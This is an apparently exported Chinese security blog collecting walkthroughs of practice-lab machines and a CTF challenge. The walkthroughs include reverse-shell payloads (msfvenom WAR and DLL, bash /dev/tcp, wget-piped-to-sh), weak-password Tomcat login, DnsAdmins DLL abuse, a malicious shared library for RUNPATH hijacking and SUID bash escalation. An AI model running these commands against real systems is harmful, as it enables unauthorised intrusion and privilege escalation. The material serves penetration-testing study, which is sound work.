工具扫描本地网络，寻找存活主机。 从扫描结果中，我们识别出目标主机的IP地址为 192.168.88.17 2.端口扫描确认目标IP后，使用 nmap 进行全端口扫描，以探测其开放的服务。 扫描结果显示目标主机开放了三个端口： 22&#x2F;tcp: SSH服务，用于远程登录。 80&#x2F;tcp: HTTP服务，一个Web服务器。 8080&#x2F;tcp: HTTP-Proxy服务，通常也是Web服务，可能是Tomcat或类似的Java应用服务器。 二、Web渗透1.80端口- Apache服务访问 http://192.168.88.17 ，发现是一个纯静态的猫咪动画页面，没有可交互的功能点。 因此，我们对其进行目录爆破，尝试发现隐藏的路径或文件。 12345678└─$ dirsearch -u http://192.168.88.17...[05:41:20] 200 - 0B - /config.php[05:41:21] 200 - 0B - /database.php[05:41:32] 200 - 0B - /upload.php[05:41:32] 301 - 320B - /uploads -&gt; http://192.168.205.149/uploads/[05:41:32] 200 - 408B - /uploads/... 目录爆破发现了一些有趣的PHP文件，如 config.php 、 database.php 和 upload.php ，但它们的大小都为0字节，表明是空文件。 &#x2F;uploads&#x2F; 目录虽然存在，但其中没有任何内容。80端口的渗透似乎陷入僵局。 2.8080端口- Tomcat服务接着，我们访问 http://192.168.88.17:8080 ，页面显示这是 Tomcat&#x2F;10.1.20 的管理界面。 Tomcat的管理后台常常存在弱口令漏洞，我们尝试使用常见用户名和密码进行登录。 弱口令尝试:1234adminmanagertomcat... 最终，在访问 http://192.168.88.17:8080/manager 时，使用 admin:tomcat 成功登录到Tomcat Web应用程序管理器。 3.获取WebShell成功登录后台后，我们可以通过部署WAR文件来获取服务器的控制权。 msfvenom首先，使用 msfvenom 生成一个Java的反向shell payload。 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.88.10 LPORT=1234 -f war -o shell.war 接着，在Tomcat后台的 “WAR file to deploy” 处上传我们生成的 shell.war 文件并部署。 访问shell触发payload。同时，在Kali上使用 netcat 开启监听。 成功接收到反弹shell，当前用户为 tomcat 。 三、权限提升为了方便后续操作，我们首先对获取的非交互式shell进行稳定化处理。 1234567script /dev/null -c bashCtrl+Zstty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=/bin/bashstty rows 36 columns 178 1.tomcat -&gt; catcatcat在目标系统中进行信息搜集，寻找可利用的提权线索。通过查找近期被修改过的文件，发现了两个可疑的二进制文件。 12/usr/local/bin/catcatcat 2025-08-02 -rwxr-xr-x 16808/usr/bin/imgcat 2025-08-02 -rwxr-xr-x 642040 imgcat 是一个在终端显示图片的工具。我们重点关注 catcatcat 这个自定义命令。使用 strings 命令检查该文件，发现硬编码的密码字符串。 也可以直接catcatcat来执行 接下来，查看 &#x2F;etc&#x2F;passwd 文件，寻找可能与此密码对应的用户。 发现存在一个名为 catcatcat 的用户。使用该用户名和找到的密码 this_is_cat_passwd 通过SSH进行登录。（su切换不了，只可以使用ssh） 12345─$ ssh catcatcat@192.168.88.17catcatcat@192.168.88.17&#x27;s password: ...catcatcat@Cat:~$ iduid=1000(catcatcat) gid=1000(catcatcat) groups=1000(catcatcat) 成功切换到 catcatcat 用户。 2.catcatcat -&gt; root登录后，检查 catcatcat 用户的 sudo 权限。 结果表明， catcatcat 用户可以免密码以root权限执行 &#x2F;usr&#x2F;bin&#x2F;imgcat 命令。这通常是一个提权的突破口，但这里是一个兔子洞（最近Sublarge很喜欢出这种兔子洞啊）。 在 catcatcat 用户的主目录下，发现一个名为 cat.jpg 的图片文件。 scp我们将此图片文件通过 scp 传回Kali进行分析。 1234kali执行；systemctl start sshsystemctl status sshsystemctl enable ssh //开机自启 12靶机执行：scp cat.jpg kali@192.168.88.10:/home/kali/Desktop stegseek使用隐写术分析工具 stegseek 对图片进行分析，尝试提取隐藏信息。 stegseek 成功在无密码的情况下提取出了一个名为 id_rsa 的文件，这通常是SSH私钥。 确认是私钥文件后，我们用它来尝试以root身份登录目标主机。 首先，赋予私钥正确的权限。 然后，使用该私钥通过SSH连接到目标。 成功获取root权限。 四、夺取Flag最后，在对应的目录下读取user和root的flag。 渗透测试完成。","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"msfvenom","slug":"msfvenom","permalink":"http://example.com/tags/msfvenom/"},{"name":"scp","slug":"scp","permalink":"http://example.com/tags/scp/"},{"name":"stegseek","slug":"stegseek","permalink":"http://example.com/tags/stegseek/"}]},{"title":"群友靶机--bicker","slug":"群友靶机--域控--bicker","date":"2025-08-21T11:50:58.439Z","updated":"2025-09-19T09:08:08.615Z","comments":true,"path":"2025/08/21/群友靶机--域控--bicker/","permalink":"http://example.com/2025/08/21/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--%E5%9F%9F%E6%8E%A7--bicker/","excerpt":"","text":"一、信息收集1.主机发现渗透测试的起点是在目标网络中识别存活主机。我们通过 arp-scan 对本地网段进行扫描，以定位我们的目标。 1nmap 192.168.196.0/24 扫描结果明确指向 192.168.196.129 为本次测试的目标主机。 2.端口与服务扫描确定目标 IP 后，使用 Nmap 进行深度探测，以绘制出目标的攻击面。首先进行全端口 TCP 连接扫描，确保不遗漏任何开放的服务。 在识别出开放端口后，我们针对这些端口进行更详细的服务版本探测和默认脚本扫描，以获取操作系统、域名、主机名等关键信息。 扫描结果分析与解读： 综合扫描结果，目标主机的画像变得极为清晰：这是一台主机名为 DC 的 Windows 域控制器，其 DNS域名为 bicker.com 。大量开放的 AD 相关端口（Kerberos, LDAP, SMB）证实了这一点。一个重要的发现是 SMB 签名被强制启用（ Message signing enabled and required ），这增加了网络层的安全性，可以有效防御 NTLM Relay 等中间人攻击。 3.Active Directory服务枚举在确认目标为域控后，我们针对其核心服务进行更具针对性的信息收集。 DNS SRV记录查询通过 dig 查询 SRV 记录，可以精确地确认提供关键服务的服务器主机名。 1dig @192.168.196.129 -t SRV _kerberos._tcp.bicker.com //向IP为 192.168.196.129 的DNS服务器查询域 bicker.com 中Kerberos身份验证服务的详细网络位置信息。 查询结果进一步证实了 Kerberos (KDC), LDAP, 和全局编录 (GC) 服务均由 dc.bicker.com( 192.168.196.129 ) 提供。 LDAP 匿名绑定探测尝试在未提供任何凭据的情况下查询 LDAP，探测是否存在允许匿名枚举的常见配置错误。 1234567891011┌──(root㉿kali)-[~]└─# ldapsearch -x -H ldap://192.168.196.129 -b &quot;DC=bicker,DC=com&quot;# extended LDIF...# search resultsearch: 2result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4f7c# numResponses: 1 服务器拒绝了匿名查询，表明其 LDAP 服务进行了基本的安全加固。 Kerberos用户名枚举利用 Kerberos 协议在处理用户存在与否时返回不同错误代码的特性，可以使用 kerbrute 等工具高效地验证用户名列表。 该步骤成功验证了 administrator , guest 等多个内置账户的存在，为后续的凭据攻击提供了目标。 AS-REP Roasting攻击尝试这是一种针对禁用了 Kerberos 预身份验证的用户的攻击。如果存在此类用户，攻击者可以为其请求 TGT，并离线爆破其中包含的加密数据以获取用户密码。 尝试失败，表明目标域中的用户均开启了预身份验证，此攻击路径无效。 二、初步突破1.SMB匿名共享探测尽管 LDAP 匿名绑定被禁用，但 SMB 服务可能存在独立的访问控制配置。我们检查是否存在无需凭据即可访问的共享。 1smbclient -L //192.168.196.135 -N 发现了一个名为 puppy 的匿名可读共享，这是一个潜在的信息泄露点。我们连接该共享并下载其中的文件到kali。 1smbclient //192.168.196.135/puppy -N 2.开源情报(OSINT)获取凭据对下载的 puppy.jpg 文件进行分析，寻找可能存在的线索。 12345strings puppy.jpg|head -n 10 //快速浏览 puppy.jpg 图片文件中嵌入的文本信息的前10条内容。这个命令是快速查看二进制文件文本内容开头的经典组合技。strings 命令会扫描整个文件，忽略那些不可读的乱码，只提取出任何长度（默认通常 &gt;=4 个字符）的可打印字符串。 文件字符串中包含一个 Bilibili UID ( 3546958956333518 )。通过在 Bilibili 网站上搜索此 UID[ UID 是 User Identifier（用户标识符）的缩写。] 我们找到了一个廷达罗斯的呼唤用户发布的动态，其中直接泄露了一组凭据： 1tindalos:Th3C@ll0fCtHu1hu! 3.获得初始Shell1evil-winrm -i 192.168.196.135 -u &#x27;tindalos&#x27; -p &#x27;Th3C@ll0fCtHu1hu!&#x27; //使用用户名 tindalos 和密码 Th3C@ll0fCtHu1hu!，通过 WinRM 协议连接到 IP 地址为 192.168.196.135 的 Windows 服务器。 利用这组意外获得的凭据，我们尝试通过之前发现的 WinRM 服务 (端口 5985) 登录目标主机。 连接成功！我们获得了一个属于域用户 bicker\\tindalos 的交互式 PowerShell Shell，完成了初步突破。 三、权限提升1.内部信息收集与态势感知立足于当前 Shell，首要任务是全面了解 tindalos 用户的权限和在域中的角色。 1whoami /all 关键发现： whoami &#x2F;all 的输出显示，用户 tindalos 隶属于 DnsAdmins 组。这是一个极度危险的内置组，其成员通常可以通过滥用 DNS 服务配置来实现权限提升至域控的 SYSTEM 。 2.提权路径分析：两条道路基于 DnsAdmins 的权限，我们有两条提权路径可选： 捷径（高噪音）： 直接配置恶意 DLL，然后通过重启整个靶机来触发执行。此方法简单粗暴，但动静巨大，在真实环境中应极力避免。 预期解（低噪音）： 深入挖掘信息，寻找一个拥有重启 DNS 服务权限的用户，通过一系列横向移动，最终在不重启服务器的情况下触发漏洞。 3.提权路径一：捷径（重启靶机）此路径利用 DnsAdmins 权限设置好后门，然后通过重启靶机这一“歪门邪道”来完美跳关。 生成恶意DLL 使用 msfvenom 创建一个反向连接 Shell 的 DLL。 把生成的dll上传到靶机上面，kali开放python服务，利用得到的初始shell下载kali生成的dll保存到靶机的C:\\Users\\tindalos\\Documents\\dns.dll目录下面文件名为dns.dll 1Invoke-WebRequest -Uri &quot;http://192.168.196.128:8000/dns.dll&quot; -OutFile &quot;C:\\Users\\tindalos\\Documents\\dns.dll&quot; 使用 dnscmd.exe 将其注册为ServerLevelPluginDll 。 1dnscmd.exe localhost /config /serverlevelplugindll C:\\Users\\tindalos\\Documents\\dns.dll 监听并（模拟）重启在 Kali 上开启监听。此时，通过虚拟化管理平台重启目标服务器，即可触发 DLL 加载。 此路径虽然可行，但绕过了靶机设计的核心挑战。 4.提权路径二：预期解（精准权限利用）这条路径考验的是在受限环境下的深度信息挖掘和横向移动能力，是更为专业和隐蔽的手法. 4.1.本地凭据挖掘枚举域用户为规划横向移动路径，我们枚举域内的其他用户及其组关系。 使用 net 命令 (经典、简单、不易触发警报) 1net user //先查看一下本地用户有哪些 123net user jianyin /domain //jianyin这是要查询的用户名net user lihua /domain 查看所有本地用户，就只有发现jianyin和lihua两个本地用户有两个关键的自定义组： DNSRestarters 和 AccountModifier 下载wine 绕过 Windows Defender 尝试执行 Seatbelt.exe 被 Defender 拦截。通过探索发现 C:\\wirteTEMP 是一个白名单目录，后续工具均在此目录下执行。 利用 DPAPI 解密凭据 技术背景：Windows 使用数据保护 API (DPAPI) 来加密存储在用户配置文件中的敏感信息。由于我们已知 tindalos 的明文密码，可以解密其 DPAPI 主密钥，进而解密由它保护的其他凭据。","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"域控","slug":"域控","permalink":"http://example.com/tags/%E5%9F%9F%E6%8E%A7/"}]},{"title":"群友靶机--chat2","slug":"群友靶机--chat2","date":"2025-08-21T07:37:29.957Z","updated":"2025-08-28T12:56:06.274Z","comments":true,"path":"2025/08/21/群友靶机--chat2/","permalink":"http://example.com/2025/08/21/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--chat2/","excerpt":"","text":"一、信息收集首先，在与目标网络相同的网段下，使用 arp-scan 工具对C段进行扫描，以发现内网中的存活主机。 发现目标主机IP为 192.168.88.12 。接下来，使用 nmap 对该主机进行全端口扫描，以探测其开放的服务。 扫描结果显示，目标主机开放了22端口（SSH服务）和80端口（HTTP服务）。 二、漏洞利用1.Web信息泄露我们首先从80端口的Web服务入手。访问 http://192.168.88.12 ，发现是一个Discuz!论坛。在“在线会员”模块中，我们注意到了一个名为 admin 的管理员用户。此外，在默认版块中发现了一篇标题为“Let’s Encrypt”的文章。 查看文章内容，发现是一段摩斯密码： 1.--. .- ... ... .-- --- .-. -.. .---- ..--- ...-- 使用在线摩斯密码解码工具，得到解码结果： 1PASSWORD123 注意：摩斯密码本身不区分字母大小写，因此在实际爆破或登录尝试时，需要考虑所有可能的大小写组合，如 password123 , Password123 , PASSWORD123 等。 2.获取Web后台权限我们当前只知道管理员用户名为 admin ，但没有SSH的用户名，因此首先尝试登录Discuz!的Web后台。 使用用户名 admin 和刚刚解码出的密码 password123 进行登录，成功进入论坛。 在用户界面中，我们找到了“管理中心”的入口，这正是我们感兴趣的地方。点击进入时，系统要求再次验证密码，我们输入 password123 后成功进入后台。 3.正向Shell在后台首页，我们注意到该Discuz! 的版本为 3.5 (20250205)，这是一个较新的版本。经过初步搜索，并未发现该版本存在已知的远程代码执行（RCE）漏洞。 于是，我们开始探索后台的各项功能。在 工具 &gt; 计划任务 中，发现一个名为 shell.php 的自定义任务。 尝试编辑该任务，发现其执行的脚本 shell.php 是写死的，无法直接修改其内容。根据命名推测，这可能是一个预留的WebShell或者一个用于建立连接的脚本。我们无法修改脚本，但可以控制其执行时间。 我们将执行周期的“每周”字段改为 * (代表每天)，并将“分钟”字段修改为当前时间的下一分钟（例如，当前是15:52，就设置为15:53）。 知识点补充：这是一种利用计划任务获取Shell的常见手法。这里的 shell.php 极有可能是一个正向Shell脚本，它会在被访问或执行时，监听服务器的某个端口，等待攻击者连接. 到达设定的时间点（xx:53）后，我们再次使用 nmap 扫描目标主机的端口。 扫描结果显示，目标主机多开放了一个 12345 端口。我们尝试使用 netcat (nc) 连接该端口。 成功连接，并且执行 id 命令后得到了回显。这是一个 www-data 用户权限的正向Shell。为了便于后续操作，我们使用以下命令将其升级为一个稳定的交互式Shell。 12345678script /dev/null -c bash# 按下 Ctrl+Z 将其挂起stty raw -echo; fg# 按下回车reset xtermexport TERM=xtermexport SHELL=/bin/bashstty rows 24 columns 80 三、横向移动1.数据库凭据发现当前我们是 www-data 用户，权限较低。首先，我们在系统中进行信息收集，寻找可以横向移动到其他用户的线索。在 &#x2F;home 目录下，发现了一个名为 discuz 的用户。 由于这是一个CMS应用，数据库配置文件通常包含了高权限的数据库用户凭据。我们在网站根目录&#x2F;var&#x2F;www&#x2F;html&#x2F;config&#x2F; 下找到了配置文件 config_global.php 。这个php文件在网站后台也可以看到有。 2.数据库信息挖掘我们找到了数据库用户 discuz_user 和密码 StrongPassword!123 。使用该凭据连接本地的MariaDB数据库。 123mysql -u discuz_user -p&#x27;StrongPassword!123&#x27;show databases; 在 discuz_db 数据库的 maze_ucenter_members 表中，我们只发现了之前登录Web后台的admin用户哈希，这对横向移动没有帮助。于是，我们将目光转向了 mysql 这个系统数据库，它存储了数据库的所有用户信息。 123use mysql;select user, host, password from user; 查询 user 表后，除了已知的 discuz_user ，我们还发现了一个名为 hackme 的用户，其密码哈希为FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2 。这是一个MySQL 4.1版本之前的旧格式哈希（ mysql_old_password ）。 我们使用在线哈希破解网站（如 crackstation.net）对此哈希进行查询，成功破解出明文密码为root123 。而discuz_user的哈希密码破解不了 3.切换用户因为discuz_user的哈希密码破解不了，而hackme不是系统用户，我们猜测 hackme 用户的密码可能就是系统用户 discuz 的密码。尝试使用 su 命令切换到 discuz用户，并输入密码 root123 。 成功切换！我们已经从 www-data 用户横向移动到了 discuz 用户 四、权限提升1.SUID提权向量与文件属性登录 discuz 用户后，我们首先检查该用户拥有的 sudo 权限，同时开始寻找系统上其他的提权向量，例如查找具有SUID权限位的二进制文件。 1find / -perm -4000 -type f -exec ls -l &#123;&#125; \\; 2&gt;/dev/null 我们得到了两条关键信息： 1.discuz 用户可以无密码以root权限执行其家目录下的 chat 程序。这是一个非常直接的提权路径。 2.&#x2F;usr&#x2F;bin&#x2F;chattr 命令被设置了SUID位。 知识点补充：SUID（Set User ID）是一种特殊的权限位。当一个可执行文件设置了SUID位后，任何用户在执行它时，进程的有效用户ID（euid）都会变成文件所有者的ID。 chattr 的所有者是root，因此我们现在可以以root权限来执行 chattr 命令。 我们的主要攻击思路是替换 &#x2F;home&#x2F;discuz&#x2F;chat 文件为一个恶意脚本，然后通过 sudo 执行它来提权。然而，当我们尝试重命名或删除该文件时，却遭到了拒绝。 1mv chat chat.bak 这个现象很不寻常，因为我们作为 discuz 用户，对自己家目录下的文件应该有写权限。这通常意味着文件被设置了特殊的扩展属性。我们使用 lsattr 命令来验证猜想。 知识点补充： lsattr 命令用于查看文件的扩展属性。这里的 i 属性（immutable）意味着该文件被“锁定”，即便是root用户也无法修改、删除、重命名或创建链接。 现在，两条线索完美地结合在了一起： chat 文件因为 i 属性而无法被修改，而我们恰好拥有一个带SUID的 chattr 命令，可以用它来移除这个 i 属性。 2.替换文件并提权提权思路已经清晰： 利用带SUID的 &#x2F;usr&#x2F;bin&#x2F;chattr 移除 &#x2F;home&#x2F;discuz&#x2F;chat 的 i 属性。 将 &#x2F;home&#x2F;discuz&#x2F;chat 替换为我们自己的恶意脚本。 通过 sudo 执行修改后的 chat 脚本，以root权限完成提权。 我们构造的恶意脚本功能是为 &#x2F;bin&#x2F;bash 添加SUID权限位，这样我们就能随时通过 bash -p 获取一个root shell。 执行以下命令： 1234567891011121314# 1. 利用SUID chattr移除 i 属性discuz@Chat2:~$ /usr/bin/chattr -i /home/discuz/chat (chattr -i chat)# 2. 备份原文件并创建恶意脚本discuz@Chat2:~$ mv chat chat.bakdiscuz@Chat2:~$ echo &#x27;chmod +s /bin/bash&#x27; &gt; chatdiscuz@Chat2:~$ chmod +x chat# 3. 检查 /bin/bash 当前权限discuz@Chat2:~$ ls -la /bin/bash-rwxr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bash# 4. 使用sudo执行我们的脚本discuz@Chat2:~$ sudo /home/discuz/chat# 5. 再次检查 /bin/bash 权限，确认SUID位已添加discuz@Chat2:~$ ls -la /bin/bash-rwsr-sr-x 1 root root 1168776 Apr 18 2019 /bin/bash 可以看到 &#x2F;bin&#x2F;bash 已经拥有了 rws 权限，SUID位设置成功。 3.获取Root Shell最后，执行 bash -p 命令，利用SUID权限获得一个 euid 为 0 (root) 的shell。 知识点补充： bash -p 中的 -p 参数告诉bash不要将有效用户ID（euid）重置为实际用户ID（uid）。如果一个可执行文件（如bash）设置了SUID位，普通用户执行它时，进程的euid会变成文件所有者（root）的ID。 -p 参数保留了这个提权后的euid，从而让我们获得root权限的shell。 五、夺取凭证成功获取root权限后，我们读取位于用户目录和root目录下的flag文件。 成功获取所有flag，渗透测试结束。","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"正向shell","slug":"正向shell","permalink":"http://example.com/tags/%E6%AD%A3%E5%90%91shell/"},{"name":"mysql_old_password","slug":"mysql-old-password","permalink":"http://example.com/tags/mysql-old-password/"},{"name":"lsattr--查看文件扩展属性","slug":"lsattr-查看文件扩展属性","permalink":"http://example.com/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/"}]},{"title":"群友靶机--grav","slug":"群友靶机--grav","date":"2025-08-20T10:29:19.403Z","updated":"2025-08-28T13:00:31.791Z","comments":true,"path":"2025/08/20/群友靶机--grav/","permalink":"http://example.com/2025/08/20/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--grav/","excerpt":"","text":"一.信息收集首先，在目标网段内使用 arp-scan 进行主机发现，确定目标主机的IP地址。 发现目标主机IP为 192.168.88.13 。接着，使用 nmap 对该主机进行全端口扫描，以探测其开放的服务。 扫描结果显示，目标主机开放了22端口（SSH）和80端口（HTTP）。 二、漏洞扫描与利用访问80端口提供的Web服务，发现是一个产品介绍页面，没有太多可交互的功能。因此，使用gobuster 进行目录扫描，以发现隐藏的路径或文件。 扫描发现了一个重要的目录 &#x2F;grav 。访问 http://192.168.88.13/grav/ ，识别出该站点是基于Grav CMS 构建的。 在浏览网页内容时，于 typography 页面发现了一组疑似后台凭据的字符串： Grav Admin : Admin@123 。 使用用户名 admin 和密码 Admin@123 尝试登录后台地址 http://192.168.88.13/grav/admin ，成功进入管理面板。 登录后台后，计划通过安装恶意的插件来获取服务器的Shell。这里利用一个已知的插件漏洞（CVE-2025-50286），通过后台的“直接安装”功能上传一个包含后门的插件压缩包 grav-plugin-simple_form-develop.zip 。 插件安装并激活后，在Kali上启动 netcat 监听1234端口。 接着，通过 curl 发送一个精心构造的GET请求来触发插件中的漏洞，执行反向Shell命令。 1curl --get --data-urlencode &quot;cmd=bash -c &#x27;bash -i &gt;&amp;/dev/tcp/192.168.88.10/1234 0&gt;&amp;1&#x27;&quot; http://192.168.88.13/grav/ 监听端成功接收到反弹Shell，当前用户为 www-data 。 三、权限提升为了便于后续操作，首先利用 script 命令将当前的Shell升级为功能更完整的交互式TTY。 1234567script /dev/null -c bashCtrl+Zstty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=/bin/bashstty rows 24 columns 80 在服务器上进行信息收集，发现在 &#x2F;home&#x2F;grav 目录下存在一个提示文件 .hint。 提示信息提到了 RUNPATH ，这是一种在ELF文件中指定的运行时库搜索路径。它具有比 LD_PRELOAD 和LD_LIBRARY_PATH 更高的优先级，如果配置不当可能导致库劫持漏洞。 根据提示，开始寻找具有SUID权限的二进制文件，这些文件是提权的常见入口点。 12find / -perm -4000 -type f -exec ls -l &#123;&#125; \\;2&gt;/dev/null 发现一个可疑的SUID文件 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;usermgr 。使用 readelf 检查其动态链接信息，确认其RUNPATH 被设置为当前目录 . 。 12345readelf -d /usr/local/bin/usermgr | grep RUNPATHreadelf -d /usr/local/bin/usermgr: 显示二进制文件 usermgr 的动态节（dynamic section）信息，这里面包含了依赖的库和路径信息。| grep RUNPATH: 通过管道 (|) 将上一条命令的输出作为输入，传递给 grep 命令，grep 会筛选并只显示包含 RUNPATH 字符串的行。 接着，使用 ldd 查看该程序依赖的动态链接库。 12ldd /usr/local/bin/usermgr //ldd（List Dynamic Dependencies）命令用于打印一个可执行文件或共享库所依赖的所有共享库。执行这个命令的输出会列出 usermgr 这个程序运行所需要链接的所有共享库（.so 文件）及其在系统中的具体位置。 usermgr 依赖一个名为 libauth.so 的库。由于 RUNPATH 被设置为 . ，这意味着当执行 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;usermgr 时，系统会首先在当前工作目录下查找libauth.so 。这为我们实施库劫持提供了条件。 切换到具有写权限的目录 &#x2F;tmp ，并编写一个恶意的C源文件 a.c 。该文件利用GCC的__attribute__((constructor)) 特性，在库被加载时自动执行代码，以root权限生成一个bash shell。 123456789// a.c#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void __attribute__((constructor)) run_on_load() &#123; setuid(0); setgid(0); char *args[] = &#123;&quot;/bin/bash&quot;, NULL&#125;; execve(&quot;/bin/bash&quot;, args, NULL);&#125; 将该C文件编译为名为 libauth.so 的共享库。 1gcc -shared -fPIC -o libauth.so a.c 最后，在 &#x2F;tmp 目录下执行 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;usermgr 。由于 RUNPATH 的设置，程序会加载我们放在 &#x2F;tmp 下的恶意 libauth.so ，从而执行其中的提权代码。 成功获取root权限。现在可以读取所有的flag文件。","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"RUNPATH","slug":"RUNPATH","permalink":"http://example.com/tags/RUNPATH/"},{"name":"readelf","slug":"readelf","permalink":"http://example.com/tags/readelf/"},{"name":"ldd","slug":"ldd","permalink":"http://example.com/tags/ldd/"},{"name":"插件漏洞","slug":"插件漏洞","permalink":"http://example.com/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/"}]},{"title":"信息收集","slug":"信息收集--源码泄露","date":"2025-08-19T07:42:29.691Z","updated":"2025-08-28T12:59:37.375Z","comments":true,"path":"2025/08/19/信息收集--源码泄露/","permalink":"http://example.com/2025/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86--%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","excerpt":"","text":"[NSSCTF 2022 Spring Recruit]ezgame信息收集–crl+u 提示：大于65分就可以拿到flag js里面隐藏着这个游戏的源代码初始分数是0，所以我们就一开始设置大于65分即可 F12-&gt;控制台 或者直接在js源代码里面crl+f搜索flag即可","categories":[{"name":"ctfshow-web-信息收集","slug":"ctfshow-web-信息收集","permalink":"http://example.com/categories/ctfshow-web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://example.com/tags/NSSCTF/"},{"name":"web源码泄露","slug":"web源码泄露","permalink":"http://example.com/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"}]},{"title":"群友靶机--book","slug":"群友靶机--book","date":"2025-08-17T08:09:27.100Z","updated":"2025-08-28T12:57:14.176Z","comments":true,"path":"2025/08/17/群友靶机--book/","permalink":"http://example.com/2025/08/17/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--book/","excerpt":"","text":"一、信息收集1.主机发现与端口扫描首先在本地网络中使用 arp-scan 确定目标主机的IP地址，随后利用 nmap 对其进行全端口扫描，以识别开放的服务。 扫描结果表明，目标主机IP为 192.168.88.9 ，开放了 22 (SSH)、80 (HTTP) 和 443 (HTTPS) 端口。访问80端口会自动跳转到443端口。 2.服务侦察HTTPS (443端口): 访问该服务发现是一个基于开源项目 cstimer 的魔方计时网站。 二、漏洞发现与初始访问1.Web参数模糊测试与RCEffuf一个快速的Web路径&#x2F;参数爆破工具 1234ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#x27;https://192.168.88.9?FUZZ=id&#x27; --fw 3928 //--fw 3928:过滤掉响应大小为 3928 字节的结果（通常用于排除错误页面）,其中 FUZZ 是占位符，会被字典中的内容替换。例如：尝试 url?admin=id、url?backup=id 等。递归扫描：发现有效参数后，可进一步爆破参数值：ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &#x27;https://192.168.88.9?admin=FUZZ&#x27; 对网站进行参数模糊测试，发现一个名为 cmd 的参数存在远程代码执行（RCE）漏洞。 2.获取 www-data Shell经过测试发现，目标主机上没有 busybox 和 curl ，直接使用 bash 反弹shell也失败，那就用wget 本地监听 1234nc -lvp 1234python3 -m http.serverreverse.sh:(html下跟临时开放的服务目录下都要有)/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.88.10/1234 0&gt;&amp;1&#x27; 执行Payload: 1curl -k https://192.168.88.9/?cmd=&#x27;wget+192.168.88.10:8000/reverse.sh+-O+-|sh&#x27; 三、权限提升1.www-data -&gt; room在 www-data shell中，查看 &#x2F;home 目录发现存在用户 peng跟room 。先看peng里面没啥，然后就看room,尝试使用弱口令 用户room ,爆破密码为room 直接用ssh连接room 2.room -&gt; root 本地服务发现: 成为 room 用户后，使用 ss -tnlp 命令发现本地 127.0.0.1 的 8888 端口上运行着一个服务。 通过 wget 访问该服务，发现是一个 Jupyter Server 的登录页面。 凭证发现与破解: 在 &#x2F;var&#x2F;backups&#x2F; 目录下找到一个Jupyter的配置文件jupyter_server_config.json ，其中包含一个 argon2 格式的哈希密码。 Argon2Cracker使用 Argon2Cracker 工具和字典对该哈希进行破解，成功得到明文密码 star123 。 3.获取Root权限:在Kali上，使用SSH的本地端口转发功能，将目标主机的8888端口映射到本地。 1ssh -L 8888:127.0.0.1:8888 room@192.168.88.9 打开kali本地浏览器访问 http://127.0.0.1:8888 ，进入Jupyter登录页面，输入破解出的密码star123 成功登录。 成功登录之后直接就可以看到root.txt打开即可 或者Jupyter Server在此处是以 root 权限运行的。通过 File &gt; New &gt; Terminal 创建一个新的终端，直接获得 root 权限的shell。 最后，在 root shell中读取两个flag文件。","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"ffuf","slug":"ffuf","permalink":"http://example.com/tags/ffuf/"},{"name":"Argon2Cracker","slug":"Argon2Cracker","permalink":"http://example.com/tags/Argon2Cracker/"}]},{"title":"群友靶机--sysadmin","slug":"群友靶机--sysadmin","date":"2025-08-15T09:47:19.530Z","updated":"2025-08-28T12:57:46.031Z","comments":true,"path":"2025/08/15/群友靶机--sysadmin/","permalink":"http://example.com/2025/08/15/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--sysadmin/","excerpt":"","text":"一、信息收集1.主机发现首先，在本地网络中利用 arp-scan 扫描存活主机，定位目标IP。通过ARP扫描，确认目标主机的IP地址为 192.168.56.3 2.端口扫描 Nmap的扫描结果显示，目标主机对外开放了 22 (SSH) 和 80 (HTTP) 两个TCP端口。 二、漏洞发现与初始访问1.Web服务侦察与漏洞分析通过浏览器访问 http://192.168.56.210 ，发现一个提供C语言在线编译和执行功能的Web应用。通过审查页面源代码注释，我们获取了其后端的编译指令： 1gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out 此编译命令中包含一个关键参数 -nostdinc 。该参数的作用是阻止编译器链接任何标准库的头文件（例如 stdio.h , unistd.h 